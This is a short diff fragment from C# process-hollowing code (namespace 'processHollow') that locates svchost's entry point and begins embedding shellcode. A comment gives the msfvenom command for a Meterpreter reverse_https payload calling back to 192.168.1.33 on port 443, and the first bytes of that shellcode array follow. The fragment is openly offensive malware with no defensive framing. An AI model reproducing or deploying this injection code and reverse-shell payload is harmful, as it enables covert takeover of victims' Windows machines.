@@ -104,6 +104,8 @@ namespace processHollow
             uint entrypoint_rva = BitConverter.ToUInt32(data, (int)ep_rva);
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
+            IntPtr nWritten = IntPtr.Zero;
+
             // msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.33 LPORT=443 -f csharp -o procHollow_meterpreter.txt
                byte[] buf = new byte[652] {
                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
